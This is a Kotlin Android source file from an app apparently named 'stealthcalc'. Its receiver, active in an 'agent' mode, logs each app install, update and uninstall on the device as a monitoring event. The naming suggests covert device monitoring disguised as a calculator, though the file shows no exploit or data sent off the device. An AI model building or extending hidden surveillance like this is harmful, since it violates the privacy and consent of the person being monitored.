package com.stealthcalc.monitoring.collector

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.stealthcalc.monitoring.model.AppInstallPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@AndroidEntryPoint
class AppInstallReceiver : BroadcastReceiver() {

    @Inject lateinit var repository: MonitoringRepository

    override fun onReceive(context: Context, intent: Intent) {
        if (!repository.isAgent) return
        if (!repository.isMetricEnabled("app_installs")) return

        val packageName = intent.data?.schemeSpecificPart ?: return
        val action = when (intent.action) {
            Intent.ACTION_PACKAGE_ADDED -> if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) "UPDATED" else "INSTALLED"
            Intent.ACTION_PACKAGE_REMOVED -> if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return else "UNINSTALLED"
            Intent.ACTION_PACKAGE_REPLACED -> "UPDATED"
            else -> return
        }

        val appName = if (action != "UNINSTALLED") {
            runCatching {
                context.packageManager.getApplicationLabel(
                    context.packageManager.getApplicationInfo(packageName, 0)
                ).toString()
            }.getOrNull()
        } else null

        val versionName = if (action != "UNINSTALLED") {
            runCatching {
                context.packageManager.getPackageInfo(packageName, 0).versionName
            }.getOrNull()
        } else null

        val pending = goAsync()
        CoroutineScope(Dispatchers.IO).launch {
            runCatching {
                val payload = Json.encodeToString(
                    AppInstallPayload(
                        packageName = packageName,
                        action = action,
                        appName = appName,
                        versionName = versionName,
                    )
                )
                repository.recordEvent(MonitoringEventKind.APP_INSTALL, payload)
            }.onFailure {
                AppLogger.log(context, "[agent]", "AppInstallReceiver error: ${it.message}")
            }
            pending.finish()
        }
    }
}
